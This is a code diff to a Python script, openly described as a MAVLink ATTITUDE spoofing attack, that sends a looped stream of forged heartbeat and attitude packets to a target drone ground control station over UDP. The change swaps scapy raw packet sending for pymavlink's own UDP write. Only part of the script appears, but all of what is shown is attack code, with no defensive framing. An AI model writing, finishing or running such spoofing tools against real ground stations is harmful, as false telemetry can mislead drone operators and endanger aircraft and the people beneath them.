@@ -1,4 +1,4 @@
-"""MAVLink ATTITUDE spoofing attack via pymavlink + scapy.
+"""MAVLink ATTITUDE spoofing attack via pymavlink UDP.
 
 Sends a stream of heartbeat + ATTITUDE packets to a target GCS UDP endpoint.
 """
@@ -11,7 +11,6 @@ import threading
 import time
 
 from pymavlink import mavutil
-import scapy.all as scapy
 
 
 def _encode_heartbeat(mav: mavutil.mavudp) -> bytes:
@@ -99,11 +98,8 @@ def send_loop(
         hb_bytes = _encode_heartbeat(mav)
         att_bytes = _encode_attitude(mav)
 
-        pkt_hb = scapy.IP(dst=target_ip) / scapy.UDP(dport=target_port) / scapy.Raw(load=hb_bytes)
-        pkt_att = scapy.IP(dst=target_ip) / scapy.UDP(dport=target_port) / scapy.Raw(load=att_bytes)
-
-        scapy.send(pkt_hb, verbose=False)
-        scapy.send(pkt_att, verbose=False)
+        mav.write(hb_bytes)
+        mav.write(att_bytes)
 
         time.sleep(interval)
 
